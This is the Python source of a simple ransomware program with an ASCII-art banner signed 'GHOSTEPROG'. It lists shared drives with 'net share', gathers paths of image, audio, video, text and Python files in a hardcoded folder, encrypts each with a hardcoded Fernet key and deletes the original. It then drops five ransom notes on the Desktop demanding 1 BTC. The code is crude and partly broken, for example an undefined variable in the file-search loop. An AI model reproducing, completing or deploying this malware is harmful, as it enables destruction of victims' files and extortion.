from subprocess import check_output
from cryptography.fernet import Fernet
from os import remove
import os
print("""     
                            ,;~'             '~;,
                          ,;                     ;,
                         ;                         ;
                        ,'                         ',
                       ,;                           ;,
                       ; ;      .           .      ; ;
                       | ;   ______       ______   ; |
                       |  `/~"     ~" . "~     "~\'  |
                       |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
                        |   |        }:{        |   |
                        |   l       / | \       !   |
                        .~  (__,.--" .^. "--.,__)  ~.
                        |     ---;' / | \ `;---     |
                         \__.       \/^\/       .__/
                          V| \                 / |V
       __                  | |T~\___!___!___/~T| |                  _____
    .-~  ~"-.              | |`IIII_I_I_I_IIII'| |               .-~     "-.
   /         \             |  \,III I I I III,/  |              /           Y
  Y          ;              \   `~~~~~~~~~~'    /               i           |
  `.   _     `._              \   .       .   /               __)         .'
    )=~         `-.._           \.    ^    ./           _..-'~         ~"<_
 .-~                 ~`-.._       ^~~~^~~~^       _..-'~                   ~.
/                          ~`-.._           _..-'~                           Y
{        .~"-._                  ~`-.._ .-'~                  _..-~;         ;
 `._   _,'     ~`-.._                  ~`-.._           _..-'~     `._    _.-
    ~~"              ~`-.._                  ~`-.._ .-'~              ~~"~
  .----.            _..-'  ~`-.._                  ~`-.._          .-~~~~-.
 /      `.    _..-'~             ~`-.._                  ~`-.._   (        ".
Y        `=--~                  _..-'  ~`-.._                  ~`-'         |
|                         _..-'~             ~`-.._                         ;
`._                 _..-'~                         ~`-.._            -._ _.'
   "-.="      _..-'~                                     ~`-.._        ~`.
    /        `.                                                ;          Y
   Y           Y                    GHOSTEPROG                Y           |
   |           ;                                              `.          /
   `.       _.'                                                 "-.____.-'
     ~-----""")
print("_______________________________________________________________________")
print()
def findDerive():
    drives = ["A:","B:","C:","E:","D:","F:","G:","H:","I:","J:"]

    system_drives = []

    cmd = check_output("net share",shell=True)
    cmd = str(cmd)
    for i in drives:
        if i in cmd:
            system_drives.append(i)

    return system_drives

# ===========================================================
f = open("paths.txt","w")
# "D: && cd D://HACK PROJECT/cryptography/New folder && dir /S /B *.

def FindFiles():
    passvand_files = ['jpg','mp3','png','txt','mp4','py']
    drives = findDerive()
    # for d in drives:
    for p in passvand_files:
        try:
            cmd = check_output("D: && cd D://HACK PROJECT/cryptography/New folder && dir /S /B *."+p,shell=True)
            cmd = str(cmd)
            cmd = cmd.replace("b'","")
            cmd = cmd.replace("'","")
            cmd = cmd.replace("\\r","")
            cmd = cmd.replace("\\n","'")
            cmd = cmd.replace("'","\n")
            cmd = cmd.replace("\\\\","\\")
            f.write(cmd)
            print(d + " ----- "+p)
        except:
            pass
    f.close()

def EncriptFiles():
    key = b'rAhW_A8Nt_JBtNduFYZXW0KsLETyRihdqksJcKvf7ds='
    Encrypt = Fernet(key)
    file = open("paths.txt", "r")
    read_file = file.readlines()
    for path in read_file:
        path = path.strip("\n")
        path = path.strip("\r")

        f = open(path , "rb")

        data = f.read()

        enc_data = Encrypt.encrypt(data)

        newfile = open(path+"[encrypted]","wb")

        newfile.write(enc_data)

        f.close()

        newfile.close()

        remove(path)

        print ("encrypted -> "+path)

FindFiles()
EncriptFiles()




def bajFile():
    bajFile = """



        Your All File Was Encrypted

        For Recive Decrypt File , Send 1btc To my Wallet

        Wallet Address: sjdhjsdhsjdhksdhjsdhskjdhskjdh

        E-mail : asjs@mail.com

    """
    deskTop = os.path.expanduser("~")+"\\Desktop\\"
  
    bajopen = open(deskTop+"bajFile.txt","w")
    bajopen.write(bajFile)
    bajopen.close()

    bajopen2 = open(deskTop+"bajFile2.txt","w")
    bajopen2.write(bajFile)
    bajopen2.close()

    bajopen3 = open(deskTop+"bajFile3.txt","w")
    bajopen3.write(bajFile)
    bajopen3.close()

    bajopen4 = open(deskTop+"bajFile4.txt","w")
    bajopen4.write(bajFile)
    bajopen4.close()

    bajopen5 = open(deskTop+"bajFile5.txt","w")
    bajopen5.write(bajFile)
    bajopen5.close()

bajFile()
